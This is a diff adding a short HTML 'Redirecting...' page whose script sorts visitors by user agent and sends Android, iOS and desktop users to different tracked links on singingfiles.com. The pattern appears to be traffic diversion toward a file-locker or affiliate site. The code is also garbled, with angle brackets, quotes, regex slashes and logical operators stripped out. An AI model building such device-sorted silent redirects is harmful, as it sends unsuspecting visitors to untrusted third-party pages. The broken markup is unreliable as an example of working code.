@@ -1,0 +1,22 @@
+!DOCTYPE html
+html lang=en
+head
+  meta charset=UTF-8 
+  meta name=viewport content=width=device-width, initial-scale=1 
+  titleRedirecting...title
+head
+body
+  script
+    var userAgent = navigator.userAgent  navigator.vendor  window.opera;
+
+    if (androidi.test(userAgent)) {
+      window.location.href = https://singingfiles.com/show.php?l=0&u=77670&id=69168;
+    } else if (iPadiPhoneiPod.test(userAgent) && !window.MSStream) {
+      window.location.href = https://singingfiles.com/show.php?l=0&u=77670&id=59476;
+    } else {
+      window.location.href = https://singingfiles.com/show.php?l=0&u=77670&id=69167;
+    }
+  script
+  pIf you are not redirected automatically, a href=httpsexample.comdesktopclick herea.p
+body
+html
